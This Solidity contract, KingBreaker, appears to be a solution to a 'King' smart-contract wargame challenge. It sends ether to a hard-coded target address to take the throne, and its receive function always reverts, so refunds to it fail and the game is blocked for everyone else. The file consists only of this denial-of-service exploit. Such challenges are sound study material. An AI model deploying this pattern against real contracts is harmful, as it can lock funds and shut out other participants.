// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBreaker {
	address king = 0xb26474A417d73A3C9BB3CEACfe5b898AB234Ad43;

	function becomeKing() public {
		(bool ok,) = king.call{value: 1000000000000001}("");
		require(ok, "Failed");
	}

	receive () external payable {
		revert("No can do...");
	}
}